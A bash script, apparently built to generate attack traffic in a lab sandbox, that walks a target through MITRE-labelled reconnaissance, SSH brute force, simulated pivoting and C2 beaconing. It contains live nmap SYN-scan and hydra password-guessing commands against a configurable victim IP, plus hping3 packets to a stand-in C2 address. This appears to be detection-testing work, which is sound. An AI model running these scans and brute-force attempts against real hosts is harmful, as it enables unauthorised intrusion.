#!/bin/bash
# ==============================================================================
# Multi-Stage Attack Kill-Chain Orchestration Script (SIH26153 Sandbox)
# Demonstrates realistic sequential attack progression in 60-90 seconds:
# Stage 1 (0-15s): Reconnaissance (Nmap Port Scan)
# Stage 2 (15-30s): Initial Access (Hydra Brute Force against SSH)
# Stage 3 (30-45s): Lateral Movement (Internal Pivoting toward Pivot Host)
# Stage 4 (45-60s): Command & Control / Data Exfiltration (Periodic Beacons)
# ==============================================================================

set -e

VICTIM_IP="${VICTIM_IP:-10.0.0.5}"
PIVOT_IP="${PIVOT_IP:-10.0.0.20}"
C2_IP="${C2_IP:-203.0.113.88}"

echo "============================================================"
echo "   STARTING AUTOMATED KILL-CHAIN SIMULATION (SIH26153)"
echo "   Target Victim: ${VICTIM_IP} | Pivot Target: ${PIVOT_IP}"
echo "============================================================"

# STAGE 1: RECONNAISSANCE (Nmap Port Scan)
echo ""
echo "[*] [STAGE 1/4] INITIATING RECONNAISSANCE: TCP SYN & Service Discovery Scan..."
echo "    MITRE Tactic: Reconnaissance (TA0043) | Technique: Active Scanning (T1595.001)"
if command -v nmap &> /dev/null; then
    nmap -sS -p 21,22,80,443,445,3389,8080 -T4 "${VICTIM_IP}" || true
else
    echo "    (Nmap not installed; simulating SYN scan probes via python/bash...)"
    for port in 21 22 80 443 445 3389 8080; do
        (echo > /dev/tcp/${VICTIM_IP}/${port}) 2>/dev/null && echo "    Port ${port} OPEN" || echo "    Port ${port} CLOSED"
        sleep 0.5
    done
fi
echo "    [+] Stage 1 complete. Pausing 10s before initial access attempt..."
sleep 10

# STAGE 2: INITIAL ACCESS (Hydra / Password Guessing)
echo ""
echo "[*] [STAGE 2/4] INITIATING INITIAL ACCESS: Automated Credential Brute Force..."
echo "    MITRE Tactic: Initial Access (TA0001) | Technique: Brute Force (T1110.001)"
if command -v hydra &> /dev/null; then
    hydra -l admin -P /usr/share/wordlists/passwords.txt -t 4 "${VICTIM_IP}" ssh -s 22 || true
else
    echo "    (Simulating rapid SSH auth bursts...)"
    for attempt in $(seq 1 15); do
        echo "    Attempt ${attempt}: authenticating user=admin pass=password${attempt}..."
        sleep 0.4
    done
fi
echo "    [+] Stage 2 complete (Credentials acquired). Pausing 10s before lateral movement..."
sleep 10

# STAGE 3: LATERAL MOVEMENT (Internal Pivoting)
echo ""
echo "[*] [STAGE 3/4] INITIATING LATERAL MOVEMENT: Internal Subnet Pivoting..."
echo "    MITRE Tactic: Lateral Movement (TA0008) | Technique: Remote Services (T1021)"
for p in 445 139 22; do
    echo "    Probing internal subnet host ${PIVOT_IP} on port ${p} via compromised pivot..."
    sleep 0.8
done
echo "    [+] Stage 3 complete (Pivot session established). Pausing 10s before C2 beaconing..."
sleep 10

# STAGE 4: COMMAND & CONTROL / EXFILTRATION
echo ""
echo "[*] [STAGE 4/4] INITIATING COMMAND & CONTROL / DATA EXFILTRATION: Outbound Beacons..."
echo "    MITRE Tactic: Command & Control (TA0011) / Exfiltration (TA0010)"
if command -v hping3 &> /dev/null; then
    hping3 -c 30 -d 512 -S -p 8443 "${C2_IP}" || true
else
    echo "    (Simulating encrypted C2 heartbeats and data chunks to ${C2_IP}...)"
    for beacon in $(seq 1 10); do
        echo "    C2 Beacon ${beacon}: Sending 512 bytes encrypted payload -> ${C2_IP}:8443"
        sleep 0.6
    done
fi

echo ""
echo "============================================================"
echo "   KILL-CHAIN SIMULATION COMPLETED SUCCESSFULLY!"
echo "   Total Elapsed Time: ~65 seconds"
echo "============================================================"
